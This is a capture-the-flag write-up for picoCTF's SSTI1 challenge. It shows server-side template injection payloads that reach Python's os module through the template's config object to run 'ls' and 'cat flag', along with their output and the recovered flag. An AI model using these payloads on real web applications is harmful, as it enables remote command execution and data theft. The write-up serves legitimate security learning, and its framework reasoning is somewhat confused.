# SSTI1

# Description
I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.
# Solution

-  In the hints of the challenge talks about [Server Side Template Injection](https://www.geeksforgeeks.org/what-is-server-side-template-injection/) using a tool like [builtwith](https://builtwith.com/) I realized that the website is built with [python](https://www.python.org/) since [Django](https://www.djangoproject.com/) is one of the most used framework I try to use this kind of attack for this framework.

``` bash 
# Input for the message field 
	{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
# Output 
 __pycache__ app.py flag requirements.txt
```

- Since I could successfully exec commands in the server and I already know the name of the flag file I can  show its contents using ```cat```

```bash
# Input for the message field 
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
# Output 
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}
```

